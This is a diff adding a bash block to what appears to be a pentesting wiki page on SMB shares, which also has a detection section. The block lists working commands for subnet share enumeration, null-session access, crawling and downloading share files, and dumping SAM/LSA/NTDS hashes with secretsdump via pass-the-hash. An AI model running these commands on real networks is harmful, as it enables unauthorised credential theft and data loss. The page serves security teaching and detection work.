@@ -75,6 +75,16 @@ targets.
 - **SAM/SECURITY/SYSTEM via `C$`/`ADMIN$`** — grab the registry hives for an
   offline [[sam-database]] / [[ntds-dit]] dump (needs admin).
 
+```bash
+nxc smb 10.0.0.0/24 -u user -p pass --shares            # readable/writable shares across a subnet ((Pwn3d!) = local admin)
+nxc smb 10.0.0.10  -u '' -p '' --shares                 # null-session shares
+smbclient -L //10.0.0.10 -N                             # list shares anonymously
+smbmap  -H 10.0.0.10 -u user -p pass -R                 # recurse + show read/write perms
+nxc smb 10.0.0.0/24 -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True   # crawl shares + loot files
+# Grab the hives for an offline dump (needs local admin on the target):
+secretsdump.py -hashes :<nt> CORP/user@target           # SAM + LSA + (on a DC) NTDS
+```
+
 ## Detection
 
 - **4624 Logon Type 3 (Network)** — an SMB logon; with **Key Length 0** it's
